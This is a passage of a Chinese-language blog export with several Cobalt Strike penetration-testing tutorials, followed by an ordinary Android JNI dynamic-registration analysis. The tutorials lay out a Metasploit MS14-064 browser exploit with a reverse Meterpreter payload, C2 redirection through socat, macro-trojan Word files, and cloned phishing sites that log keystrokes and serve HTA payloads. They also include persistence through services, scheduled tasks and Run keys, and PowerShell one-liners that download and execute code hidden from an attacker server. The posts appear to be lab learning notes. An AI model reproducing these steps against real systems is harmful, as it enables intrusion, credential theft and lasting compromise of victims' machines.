msf5 exploit(windows/browser/ms14_064_ole_code_execution) &gt; set SRVHOST 192.168.3.51
SRVHOST =&gt; 192.168.3.51
msf5 exploit(windows/browser/ms14_064_ole_code_execution) &gt; set SRVPORT 80
SRVPORT =&gt; 80
msf5 exploit(windows/browser/ms14_064_ole_code_execution) &gt; set payload windows/meterpreter/reverse_http
payload =&gt; windows/meterpreter/reverse_http
msf5 exploit(windows/browser/ms14_064_ole_code_execution) &gt; set LHOST 192.168.3.51
LHOST =&gt; 192.168.3.51
msf5 exploit(windows/browser/ms14_064_ole_code_execution) &gt; set LPORT 905
LPORT =&gt; 905
msf5 exploit(windows/browser/ms14_064_ole_code_execution) &gt; set disablepayloadhandler true	// 不需要在metasploit框架内创建处理程序来服务有效负载连接
disablepayloadhandler =&gt; true
msf5 exploit(windows/browser/ms14_064_ole_code_execution) &gt; set PrependMigrate true	// 告诉metasploit框架修改其stager，以便在利用之后立即迁移到另一个进程
PrependMigrate =&gt; true
msf5 exploit(windows/browser/ms14_064_ole_code_execution) &gt; exploit
[*] Exploit running as background job 9.

[*] Using URL: http://192.168.3.51:80/NqnvkKl
[*] Server started.
</code></pre>
<ol start="2">
<li>在CS中创建http监听端口905</li>
</ol>
<img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531170120118.png" class="" title="image-20210531170120118">

<ol start="3">
<li>在xp虚拟机下打开这个上面我们生成的漏洞url（因为这个生成的漏洞只能在xp下生效）</li>
</ol>
<img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531170356982.png" class="" title="image-20210531170356982">

<ol start="4">
<li>在CS下可以看到回连消息</li>
</ol>
<img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531170530899.png" class="" title="image-20210531170530899"></li>
</ol>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>-Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt Strike(二)</title>
    <url>/2021/05/25/Cobalt-Strike-%E4%BA%8C/</url>
    <content><![CDATA[<h2 id="Cobalt-Strike重定器"><a href="#Cobalt-Strike重定器" class="headerlink" title="Cobalt Strike重定器"></a>Cobalt Strike重定器</h2><p>域名：kali123.com</p>
<p>dns服务器 ：192.168.3.40</p>
<p>csserver(kali)：192.168.3.8	k.kali.com</p>
<p>Ubuntu：192.168.3.42</p>
<span id="more"></span>

<h3 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h3><ol>
<li><p>什么是“重定器”：</p>
<p>“重定器”是一个在“CS”服务器和目标网络之间的服务器。作用是对你团队服务器下的连接，用做代理服务器或端口转发服务。	</p>
</li>
<li><p>作用</p>
<pre><code> 1. 保护服务器地址
 2. 增强适应能力，保持通信
</code></pre>
</li>
<li><p>使用的工具</p>
<p><code>socat TCP4-LISTEN:80，fork TCP4:[team server]:80</code></p>
<p>可以用这个工具来建立80端口的连接管理，并且继续在80端口运行那个连接团队服务器的连接。</p>
<p>linux系统的使用命令</p>
<p><code>socat TCP4-LISTEN:80,fork TCP4:team.cskali.com:80</code></p>
</li>
</ol>
<p>重定向拓扑图</p>
<img src="/2021/05/25/Cobalt-Strike-%E4%BA%8C/image-20210525172341978.png" class="" title="image-20210525172341978">

<ol start="4">
<li><p>本地域名配置</p>
<p>​	先配置一下DNS信息</p>
<img src="/2021/05/25/Cobalt-Strike-%E4%BA%8C/image-20210525201436816.png" class="" title="image-20210525201436816">	

<p>​	然后在我们用我们的windows虚拟机输入域名连接一下csserver</p>
<p>​		a. 修改本地的DNS</p>
<img src="/2021/05/25/Cobalt-Strike-%E4%BA%8C/image-20210525201836804.png" class="" title="image-20210525201836804">

<p>​		b. 连接csserver：连接成功</p>
<img src="/2021/05/25/Cobalt-Strike-%E4%BA%8C/image-20210525201946554.png" class="" title="image-20210525201946554">
</li>
<li><p>在重定向服务器上使用socat工具进行重定向</p>
<img src="/2021/05/25/Cobalt-Strike-%E4%BA%8C/image-20210525224849860.png" class="" title="image-20210525224849860">
</li>
<li><p>上线后监控靶机的流量可以看到都是流向重定向服务器的流量说明建立连接并中专成功</p>
<img src="/2021/05/25/Cobalt-Strike-%E4%BA%8C/image-20210525230254333.png" class="" title="image-20210525230254333">

<img src="/2021/05/25/Cobalt-Strike-%E4%BA%8C/image-20210525230127596.png" class="" title="image-20210525230127596"></li>
</ol>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>-Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt-Strike-八 提权</title>
    <url>/2021/06/02/Cobalt-Strike-%E5%85%AB-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
    <content><![CDATA[<p>提权顾名思义简单来说就是将普通用户的权限提升至管理员权限</p>
<span id="more"></span>

<h1 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h1><h2 id="什么是UAC"><a href="#什么是UAC" class="headerlink" title="什么是UAC"></a>什么是UAC</h2><p>用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。</p>
<h1 id="使用提权"><a href="#使用提权" class="headerlink" title="使用提权"></a>使用提权</h1><p>点击选择Elevate</p>
<img src="/2021/06/02/Cobalt-Strike-%E5%85%AB-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20210602205410874.png" class="" title="image-20210602205410874">

<p>这里有两种默认自带的两种提权方式：直接选择使用，试过之后在win7上都可以成功提权</p>
<img src="/2021/06/02/Cobalt-Strike-%E5%85%AB-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20210602205919591.png" class="" title="image-20210602205919591">

<h1 id="powerup提权"><a href="#powerup提权" class="headerlink" title="powerup提权"></a>powerup提权</h1><p>下载powershell脚本</p>
<p><code>https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</code></p>
<p>命令上传脚本</p>
<p><code>powershell-import</code></p>
<img src="/2021/06/02/Cobalt-Strike-%E5%85%AB-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20210602221955553.png" class="" title="image-20210602221955553">

<p>执行上传的脚本</p>
<p><code>powershell invoke-allchecks</code></p>
<ul>
<li>未完待续</li>
</ul>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>-Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt-Strike-六</title>
    <url>/2021/05/31/Cobalt-Strike-%E5%85%AD/</url>
    <content><![CDATA[<h2 id="Cobalt-Strike进行钓鱼攻击"><a href="#Cobalt-Strike进行钓鱼攻击" class="headerlink" title="Cobalt Strike进行钓鱼攻击"></a>Cobalt Strike进行钓鱼攻击</h2><h3 id="一-生成后门"><a href="#一-生成后门" class="headerlink" title="一. 生成后门"></a>一. 生成后门</h3><span id="more"></span>

<p>​	以宏病毒为例</p>
<ol>
<li><p>宏病毒：点击选项卡生成office宏病毒，并选择一个合适的监听器，然后可以看到弹出下图的提示卡片</p>
<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601150512845.png" class="" title="image-20210601150512845">

<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601150926236.png" class="" title="image-20210601150926236">
</li>
<li><p>按照卡片提示，新建word文档，点击查看宏</p>
<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601161854566.png" class="" title="image-20210601161854566">

<p>2.1. 创建宏</p>
<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601161943020.png" class="" title="image-20210601161943020">

<p>2.2. 用CS生成的宏木马替换原有的宏代码</p>
<p>​	<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601162319165.png" class="" title="image-20210601162319165"></p>
<p>2.3. 保存创建的word文档</p>
<p>​	<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601162613290.png" class="" title="image-20210601162613290"></p>
</li>
<li><p>打卡word就能够看到已经上线</p>
<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601162739069.png" class="" title="image-20210601162739069"></li>
</ol>
<h3 id="二-钓鱼模块"><a href="#二-钓鱼模块" class="headerlink" title="二. 钓鱼模块"></a>二. 钓鱼模块</h3><ol>
<li><p>web管理模块：可以看到我们生成的所有web模块</p>
<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601170653789.png" class="" title="image-20210601170653789">

<ol start="2">
<li>克隆网站：对克隆网站进行键盘记录</li>
</ol>
<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601175338884.png" class="" title="image-20210601175338884">

<p>2.1. 在web log窗口可以看到我们在网页输入的内容</p>
<p>​	<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601175614124.png" class="" title="image-20210601175614124"></p>
<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601175646210.png" class="" title="image-20210601175646210">


</li>
<li><p>克隆网站：执行下载木马</p>
<p>3.1 先来生成一个hta文件</p>
<p>​	<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601181637920.png" class="" title="image-20210601181637920"></p>
<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601181815662.png" class="" title="image-20210601181815662">

<p>3.2. 然后将生成的hta文件托管到cs：修改一下Local URL的文件名</p>
<p>​	<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601183016631.png" class="" title="image-20210601183016631"></p>
<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601183300398.png" class="" title="image-20210601183300398">

<p>3.3. 会生成一个url</p>
<p>​	<code>http://192.168.3.8:80/update.hta</code></p>
<p>3.4. 选择克隆网站功能：填写要克隆的网站和用来下载的木马</p>
<p>​	<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601183815033.png" class="" title="image-20210601183815033"></p>
<p>3.5. 选择好之后点击clone会生成一个新的链接</p>
<p>​	<code>http://192.168.3.8:80/</code></p>
<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601184218948.png" class="" title="image-20210601184218948">

<p>3.6. 在浏览器输入链接：就会进入克隆的网页，并且下载病毒文件</p>
<p>​	<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601184348590.png" class="" title="image-20210601184348590"></p>
</li>
<li><p>用metasploit溢出代码+CS进行钓鱼攻击</p>
<p>4.1. 用MSF生成溢出攻击的url</p>
<p>​	<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601191121929.png" class="" title="image-20210601191121929"></p>
<p>4.2. 将生成的url放入到克隆网站的attack里面</p>
<p>​	<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601191942438.png" class="" title="image-20210601191942438"></p>
<p>4.3. 在浏览器中输入生成的网址，就可以看到回连成功</p>
<p>​	<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601192102192.png" class="" title="image-20210601192102192"></p>
<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601192224430.png" class="" title="image-20210601192224430"></li>
</ol>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>-Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt-Strike-十-可持续后门的使用</title>
    <url>/2021/06/07/Cobalt-Strike-%E5%8D%81-%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%90%8E%E9%97%A8%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="服务自启动"><a href="#服务自启动" class="headerlink" title="服务自启动"></a>服务自启动</h1><span id="more"></span>

<ol>
<li><p>先创建一个与目标机的连接并提升权限</p>
<img src="/2021/06/07/Cobalt-Strike-%E5%8D%81-%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%90%8E%E9%97%A8%E7%9A%84%E4%BD%BF%E7%94%A8/image-20210607152012477.png" class="" title="image-20210607152012477">
</li>
<li><p>再使用以下命令来创建自启动服务有两种方式</p>
<p>2.1. 一种是从远程通过web下载shell来执行自启动服务</p>
<pre><code>shell sc create "Windows Power" binpath= "cmd /c start powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.3.58:81/a'))\""
shell sc config "Windows Power" start= auto
shell sc description "Windows Power" "windows auto service"
shell net start "Windows Power"	// 启动服务
shell sc delete "Windows Power"	// 删除服务
</code></pre>
<img src="/2021/06/07/Cobalt-Strike-%E5%8D%81-%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%90%8E%E9%97%A8%E7%9A%84%E4%BD%BF%E7%94%A8/image-20210607153341617.png" class="" title="image-20210607153341617">

<p>2.2. 通过执行本地的后门程序来启动</p>
<pre><code>shell sc create "server power" binpath= "C:\Users\Administrator\Desktop\artifact.exe"
shell sc description "server power" "description" 设置服务的描述字符串
shell sc config "server power" start= auto 设置这个服务为自动启动
shell net start "server power" 启动服务
</code></pre>
<ul>
<li>第二种方法跟第一种差不多是同样的命令，但是第二种是通过本地程序启动的，如果本地程序做了免杀处理的话会更容易躲过杀毒软件的拦截</li>
</ul>
</li>
</ol>
<h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>创建任务</p>
<p><code>schtasks /create /tn "windowsup" /tr "C:\Users\win7-x86-analyse\Desktop\shell\artifact.exe" /ru SYSTEM /sc onstart</code></p>
<p>查询任务</p>
<p><code>schtasks /query /tn windowsup</code></p>
<ul>
<li><p>查询任务如果提示失败（无法加载资源列表）</p>
<p><code>chcp 437	// 使用命令修改字符集</code></p>
<img src="/2021/06/07/Cobalt-Strike-%E5%8D%81-%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%90%8E%E9%97%A8%E7%9A%84%E4%BD%BF%E7%94%A8/image-20210607155030989.png" class="" title="image-20210607155030989"></li>
</ul>
<p>手工运行任务</p>
<p><code>schtasks /run /tn windowsup</code></p>
<img src="/2021/06/07/Cobalt-Strike-%E5%8D%81-%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%90%8E%E9%97%A8%E7%9A%84%E4%BD%BF%E7%94%A8/image-20210607155616931.png" class="" title="image-20210607155616931">

<img src="/2021/06/07/Cobalt-Strike-%E5%8D%81-%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%90%8E%E9%97%A8%E7%9A%84%E4%BD%BF%E7%94%A8/image-20210607155640636.png" class="" title="image-20210607155640636">

<h1 id="注册表启动"><a href="#注册表启动" class="headerlink" title="注册表启动"></a>注册表启动</h1><p><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Keyname" /t REG_SZ /d "C:\Users\win7-x86-analyse\Desktop\shell\artifact.exe" /f</code></p>
<img src="/2021/06/07/Cobalt-Strike-%E5%8D%81-%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%90%8E%E9%97%A8%E7%9A%84%E4%BD%BF%E7%94%A8/image-20210607155817037.png" class="" title="image-20210607155817037">

]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>-Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt-Strike-四</title>
    <url>/2021/05/28/Cobalt-Strike-%E5%9B%9B/</url>
    <content><![CDATA[<h2 id="Cobalt-Strike用户驱动攻击"><a href="#Cobalt-Strike用户驱动攻击" class="headerlink" title="Cobalt Strike用户驱动攻击"></a>Cobalt Strike用户驱动攻击</h2><p>使用cs生成木马让目标机上线后</p>
<p>有很多用户驱动攻击的模块可以使用</p>
<span id="more"></span>

<img src="/2021/05/28/Cobalt-Strike-%E5%9B%9B/image-20210528164836829.png" class="" title="image-20210528164836829">

<p>这里可以修改sleep的时间：获取信息的间隔时间/s</p>
<img src="/2021/05/28/Cobalt-Strike-%E5%9B%9B/image-20210528164602695.png" class="" title="image-20210528164602695">
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>-Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt Strike使用（一）</title>
    <url>/2021/05/24/Cobalt-Strike%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h3><p>​	Cobalt Strike作为一款GUI的框架式渗透工具，集成了端口转发、服务扫描、自动化溢出、多模式端口监听、exe\dll\java木马生成、office宏病毒生成、木马捆绑；钓鱼攻击包括：站点克隆、目标信息获取、java执行、浏览器自动攻击等等。</p>
<span id="more"></span>

<h3 id="运行环境："><a href="#运行环境：" class="headerlink" title="运行环境："></a>运行环境：</h3><p>​	Cobalt Strike4.3</p>
<p>​	首先安装使用前需要安装java环境jre</p>
<p>​	服务器：kali 或者 Debian会比较好，Ubuntu的话可能会有些端口占用的问题需要处理</p>
<p>​	客户端：安装jre即可使用（跨平台）</p>
<h3 id="启动："><a href="#启动：" class="headerlink" title="启动："></a>启动：</h3><h4 id="1-创建服务器"><a href="#1-创建服务器" class="headerlink" title="1. 创建服务器"></a>1. 创建服务器</h4><p>​	<code>./teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]</code></p>
<p>​	<host> is the (default) IP address of this Cobalt Strike team server<br>​	<password> is the shared password to connect to this server<br>​	[/path/to/c2.profile] is your Malleable C2 profile<br>​	[YYYY-MM-DD] is a kill date for Beacon payloads run from this server</password></host></p>
<img src="/2021/05/24/Cobalt-Strike%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20210524214346922.png" class="" title="image-20210524214346922">

<h4 id="2-客户端连接"><a href="#2-客户端连接" class="headerlink" title="2. 客户端连接"></a>2. 客户端连接</h4><ul>
<li>linux启动方式</li>
</ul>
<p><code>./cobaltstrike</code></p>
<img src="/2021/05/24/Cobalt-Strike%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20210524214809083.png" class="" title="image-20210524214809083">

<ul>
<li>Windows启动方式</li>
</ul>
<img src="/2021/05/24/Cobalt-Strike%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20210525144617108.png" class="" title="image-20210525144617108">

<p>​	设置好同一个server端IP之后客户端之间可以在Event Log窗口聊天通信</p>
<p>​	<img src="/2021/05/24/Cobalt-Strike%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20210525150508853.png" class="" title="image-20210525150508853"></p>
<h4 id="3-让目标连接上teamserver"><a href="#3-让目标连接上teamserver" class="headerlink" title="3. 让目标连接上teamserver"></a>3. 让目标连接上teamserver</h4><p>3.1. 设置监听器</p>
<img src="/2021/05/24/Cobalt-Strike%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20210525151153511.png" class="" title="image-20210525151153511">

<p>3.2. 生成攻击载荷</p>
<p>​	在这里选择给我们的监听器添加一个攻击载荷</p>
<p>​	<img src="/2021/05/24/Cobalt-Strike%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20210525151352591.png" class="" title="image-20210525151352591"></p>
<img src="/2021/05/24/Cobalt-Strike%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20210525152525524.png" class="" title="image-20210525152525524">

<p>​	添加在和成功之后会有一个弹窗：我们保存这个弹窗中的powershell命令</p>
<img src="/2021/05/24/Cobalt-Strike%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20210525152627340.png" class="" title="image-20210525152627340">

<p>​	<code>powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.3.8:80/b'))"</code></p>
<p>​	我们可以看到这个powershell命令的作用是从连接处下载内容并以隐藏的方式执行</p>
<p>3.3. 在目标机上运行</p>
<p>​	在目标机让命令行运行这段powershell命令可以看到目标机上线</p>
<img src="/2021/05/24/Cobalt-Strike%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20210525154736503.png" class="" title="image-20210525154736503">













]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>-Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>Dalvik/ART下JNI方法的动态注册原理与追踪</title>
    <url>/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/</url>
    <content><![CDATA[<p>在之前的JNI代码中我们都是使用的静态注册，使用<code>extern "C"</code>来编译，这样的代码在编译之后的so文件中仍然会保留原函数名，对APK的安全性有一定影响。</p>
<p>接下来我们尝试一下将静态注册的JNI函数改为动态注册，比较一下和之前有何不同。</p>
<p>以及对于改为动态注册的函数我们应该如何去追踪。</p>
<span id="more"></span>

<h1 id="静态注册与动态注册"><a href="#静态注册与动态注册" class="headerlink" title="静态注册与动态注册"></a>静态注册与动态注册</h1><p>JNI函数被调用前，必须要完成Java与so的绑定：</p>
<ul>
<li>被动（静态）：由Dalvik/ART虚拟机在调用前查找并完成地址的绑定<ul>
<li>静态函数名规则：Java_包名_类名_方法名</li>
<li>优点：函数名简单明了</li>
<li>缺点：名字过长、查抓效率不高、安全性降低</li>
</ul>
</li>
<li>主动（动态）：由APP自己完成地址的绑定</li>
</ul>
<p>静态注册</p>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231019153051665.png" class="" title="image-20231019153051665">

<p><mark>反编译静态注册的so文件</mark></p>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231021221027648.png" class="" title="image-20231021221027648">

<ul>
<li>例如这个静态注册JNI代码编译后的so文件，用IDA反编译之后就能直接通过搜索函数名定义到函数位置。</li>
</ul>
<p>动态注册</p>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231019153303831.png" class="" title="image-20231019153303831">



<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231020014348852.png" class="" title="image-20231020014348852">

<blockquote>
<p>可以将原来的<code>extern "C"</code>给去掉，函数名无所谓可以随便写就是一个标识</p>
<p>在JNI_OnLoad中手动绑定</p>
<pre><code class="C++"> JNINativeMethod jniNativeMethod[] = {
         {"onCreate", "(Landroid/os/Bundle;)V", (void*)onCreate},
         {"newObject", "()V", (void*)newObject}
 };
 jclass MainActivityjclass = env-&gt;FindClass("com/xiaoeryu/reflectiontest/MainActivity");
 env-&gt;RegisterNatives(MainActivityjclass, jniNativeMethod, sizeof(jniNativeMethod)/sizeof(JNINativeMethod));
 jclass tmpjclass = env-&gt;FindClass("com/xiaoeryu/reflectiontest/Test");
 jclass testjclass = static_cast&lt;jclass&gt;(env-&gt;NewWeakGlobalRef(tmpjclass));
</code></pre>
<p>通过<code>RegisterNatives()</code>方法完成手动绑定</p>
</blockquote>
<p>在JNI函数前加上<code>__attribute__ ((visibility ("hidden"))) </code>来隐藏符号信息</p>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231020015132363.png" class="" title="image-20231020015132363">

<p>隐藏了之后就无法在IDA里面直接搜索到这个函数了</p>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231020221300327.png" class="" title="image-20231020221300327">

<h2 id="Dalvik下动态注册的原理"><a href="#Dalvik下动态注册的原理" class="headerlink" title="Dalvik下动态注册的原理"></a>Dalvik下动态注册的原理</h2><p>查看源码分析一下<code>RegisterNatives</code>的实现</p>
<blockquote>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231020223718539.png" class="" title="image-20231020223718539">

<ul>
<li><p>查看其在Android4.4中的实现</p>
<pre><code class="C++">2453/*
2454 * Register one or more native functions in one class.
2455 *
2456 * This can be called multiple times on the same method, allowing the
2457 * caller to redefine the method implementation at will.
2458 */
2459static jint RegisterNatives(JNIEnv* env, jclass jclazz,
2460    const JNINativeMethod* methods, jint nMethods)
2461{
2462    ScopedJniThreadState ts(env);
2463
2464    ClassObject* clazz = (ClassObject*) dvmDecodeIndirectRef(ts.self(), jclazz);
2465
2466    if (gDvm.verboseJni) {
2467        ALOGI("[Registering JNI native methods for class %s]",
2468            clazz-&gt;descriptor);
2469    }
2470
2471    for (int i = 0; i &lt; nMethods; i++) {
2472        if (!dvmRegisterJNIMethod(clazz, methods[i].name,
2473                methods[i].signature, methods[i].fnPtr))
2474        {
2475            return JNI_ERR;
2476        }
2477    }
2478    return JNI_OK;
2479}
</code></pre>
</li>
<li><p>函数参数：</p>
<ul>
<li><code>jclass jclazz</code>：表示要注册本地方法的Java类</li>
<li><code>const JNINativeMethod* methods</code>：是一个指向<code>JNINativeMethod</code>结构体数组的指针，该结构体包含了本地方法的名称、签名和函数指针</li>
<li><code>jint nMethods</code>：表示要注册的本地方法的数量</li>
</ul>
</li>
<li><p>这个函数的目的是将本地方法与Java类相关联，以便在Java代码中调用这些本地方法。</p>
</li>
<li><p>往下分析可以看到具体的实现在<code>dvmRegisterJNIMethod</code>函数中，跟进去看一下</p>
<pre><code class="C++">static bool dvmRegisterJNIMethod(ClassObject* clazz, const char* methodName,
                                 const char* signature, void* fnPtr)
{
    
    ...


    Method* method = dvmFindDirectMethodByDescriptor(clazz, methodName, signature);	// 这个method表示Java函数在Dalvik当中对应的结构体
        
    ...
        
    if (method-&gt;nativeFunc != dvmResolveNativeMethod) {
        /* this is allowed, but unusual */
        /* 这里表示允许这个JNI函数注册两次，不过不常见*/
        ALOGV("Note: %s.%s:%s was already registered", clazz-&gt;descriptor, methodName, signature);
    }
    method-&gt;fastJni = fastJni;
    dvmUseJNIBridge(method, fnPtr);
}
</code></pre>
<p>比如说在这里注册的时候可以让它注册两次，可以绑定不同的本地方法。（如果在动态调试APP的时候碰到有JNI函数在不同的时刻注册在了不同的地址，可能就是这种情况）<mark>暂时没发现有啥用</mark></p>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231020232142297.png" class="" title="image-20231020232142297">
</li>
<li><p>继续往下分析，还可以看到有很多地方都使用到了<code>method</code>结构体，那分析这个有什么用呢？</p>
<ul>
<li>我们可以修改源码在调用method的地方添加log，重新编译，然后再运行APP的时候就可以将动态注册的结构体的注册信息打印出来。</li>
<li>暂时没有运行4.4的设备，而且Dalvik比较少用了就不去修改源码重新编译了，等下分析ART源码跟踪一下在ART中的动态注册的结构体。</li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="ART下动态注册的原理"><a href="#ART下动态注册的原理" class="headerlink" title="ART下动态注册的原理"></a>ART下动态注册的原理</h2><p>接下来分析Android8.0的ART源码，并修改源码在关键点加LOG获取动态注册的JNI函数地址。</p>
<h4 id="ART下动态注册分析"><a href="#ART下动态注册分析" class="headerlink" title="ART下动态注册分析"></a>ART下动态注册分析</h4><img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231021094617207.png" class="" title="image-20231021094617207">

<p>跟进来之后可以看到函数的实现</p>
<pre><code class="C++">2148    static jint RegisterNatives(JNIEnv* env, jclass java_class, const JNINativeMethod* methods,
2149                                jint method_count) {
2150      return RegisterNativeMethods(env, java_class, methods, method_count, true);
2151    }
</code></pre>
<ul>
<li>跟进<code>RegisterNativeMethods</code></li>
</ul>
<pre><code class="C++">3054  void RegisterNativeMethods(JNIEnv* env, const char* jni_class_name, const JNINativeMethod* methods,
3055                             jint method_count) {
3056    ScopedLocalRef&lt;jclass&gt; c(env, env-&gt;FindClass(jni_class_name));
3057    if (c.get() == nullptr) {
3058      LOG(FATAL) &lt;&lt; "Couldn't find class: " &lt;&lt; jni_class_name;
3059    }
3060    JNI::RegisterNativeMethods(env, c.get(), methods, method_count, false);
3061  }
3062  
3063  }  // namespace art
</code></pre>
<ul>
<li>跟进<code>JNI::RegisterNativeMethods</code></li>
</ul>
<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231021095331916.png" class="" title="image-20231021095331916">

<img src="/2023/10/21/Dalvik-ART%E4%B8%8B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%8E%9F%E7%90%86%E8%BF%BD%E8%B8%AA/image-20231021173436019.png" class="" title="image-20231021173436019">

